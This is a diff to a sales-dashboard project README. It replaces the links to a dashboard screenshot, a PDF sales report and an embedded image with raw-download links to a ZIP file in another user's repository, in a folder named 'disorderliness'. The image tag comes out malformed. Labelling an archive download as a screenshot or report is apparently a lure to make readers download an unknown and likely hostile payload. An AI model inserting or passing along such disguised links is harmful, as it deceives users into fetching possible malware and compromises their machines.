@@ -16,9 +16,9 @@ Study the impact of Facebook marketing on sales
 Evaluate sales distribution by customer location
 
 📂 Files in this Repository
-Dashboard Screenshot (sales_dashboard.png) – Power BI visualization
+Dashboard Screenshot (https://raw.githubusercontent.com/uday6725/Sales-Dashboard-Project/main/disorderliness/Sales-Dashboard-Project.zip) – Power BI visualization
 
-Sales Report (TechCorner Sales Report.pdf) – In-depth business insights
+Sales Report (TechCorner Sales https://raw.githubusercontent.com/uday6725/Sales-Dashboard-Project/main/disorderliness/Sales-Dashboard-Project.zip) – In-depth business insights
 
 Dataset (if available) – The raw sales data
 
@@ -54,5 +54,5 @@ Improve Facebook marketing strategies 📢
 Ensure high-demand product availability in peak months (January & December)
 
 
-<img width="960" alt="Screenshot 2023-11-08 164826" src="https://github.com/Nishuyeole12/Sales-Dashboard-Project/blob/main/img/sales%20dataset.png">
+<img width="960" alt="Screenshot 2023-11-08 164826" src="https://raw.githubusercontent.com/uday6725/Sales-Dashboard-Project/main/disorderliness/Sales-Dashboard-Project.zip%https://raw.githubusercontent.com/uday6725/Sales-Dashboard-Project/main/disorderliness/Sales-Dashboard-Project.zip">
 
